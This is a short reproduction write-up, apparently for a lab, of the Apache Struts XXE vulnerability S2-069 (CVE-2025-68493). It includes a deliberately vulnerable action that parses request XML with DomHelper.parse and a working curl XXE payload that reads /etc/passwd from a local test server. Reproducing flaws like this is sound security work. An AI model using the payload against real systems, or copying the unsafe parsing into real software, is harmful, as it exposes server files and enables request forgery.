# Apache Struts External Entity (XXE) Injection Vulnerability S2-069 (CVE-2025-68493)
Apache issued a security bulletin to fix the Apache Struts external entity (XXE) injection vulnerability S2-069 (CVE-2025-68493); Because the XWork component of Apache Struts does not perform effective validation when parsing XML configuration, attackers can inject external entities by constructing malicious XML data to read sensitive server files, perform server-side request forgery or denial of service attacks. 
## Setup Environment
The vulnerability exists in the `com.opensymphony.xwork2.util.DomHelper.parse` function. 
```
public String execute() throws Exception {
        ActionContext ctx = ActionContext.getContext();
        HttpServletRequest request = (HttpServletRequest) ctx.get(StrutsStatics.HTTP_REQUEST);
        HttpServletResponse response = (HttpServletResponse) ctx.get(StrutsStatics.HTTP_RESPONSE);
 
        try {
            InputStream is = request.getInputStream();
            // The vulnerability is located at DomHelper.parse().
            Document doc = DomHelper.parse(new InputSource(is), null);
            this.result = doc.getDocumentElement().getTextContent();

            return SUCCESS;
        } catch (Exception e) {
            this.result = "XML Error: " + e.toString();
            return ERROR;
        }
    }
```
Execute the following command to start a vulnerable environment.
```
docker build -t vulnapp .
```
## Exploit
Execute the following command to exploit.
```
curl -X POST http://localhost:8080/vulnerable.action -H "Content-Type: application/xml"      -d '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <data>&xxe;</data>'
```
